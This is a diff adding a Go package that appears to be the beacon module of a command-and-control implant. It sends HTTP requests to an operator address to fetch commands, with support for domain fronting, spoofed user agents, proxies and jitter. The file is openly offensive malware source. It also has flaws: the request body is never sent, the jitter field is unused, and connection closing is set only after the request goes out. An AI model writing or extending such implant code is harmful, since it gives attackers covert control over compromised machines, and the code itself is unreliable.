@@ -1,0 +1,81 @@
+package bark
+
+import (
+	"io"
+	"net/http"
+)
+
+type Barker interface {
+	Bark(BarkMsg) ([]byte, error)
+}
+
+type BarkConfig struct {
+	//addr
+	Addr string
+
+	//Host header (for domain fronting) and user-agent
+	Hh string
+	Ua string
+
+	Proxyurl  string
+	Proxyuser string
+	Proxy     bool
+
+	//transport
+	Jit float64
+	Tr  http.RoundTripper
+
+	//cookies:
+	Jar http.CookieJar
+}
+
+type BarkMsg struct {
+	Uri    string
+	Method string
+
+	//Request Data
+	//Headers [][]string - Unsupported in this version.
+	//Cookies [][]string
+
+	Body []byte
+}
+
+// Beacon out for cmd
+func (barkerconf *BarkConfig) Bark(Msg BarkMsg) ([]byte, error) {
+
+	//Create new request
+	request, err := http.NewRequest(Msg.Method, barkerconf.Addr+Msg.Uri, nil)
+	if err != nil {
+		return nil, err
+	}
+	if barkerconf.Hh != "" {
+		request.Host = barkerconf.Hh
+
+	}
+	request.Header.Set("User-Agent", barkerconf.Ua)
+
+	//init client and send request.
+	client := &http.Client{Transport: barkerconf.Tr}
+	var resp *http.Response
+	resp, err = client.Do(request)
+	if err != nil {
+
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	request.Close = true
+
+	if resp.StatusCode != 200 {
+
+		return nil, nil
+	}
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+
+		return nil, nil
+	}
+
+	return body, nil
+}
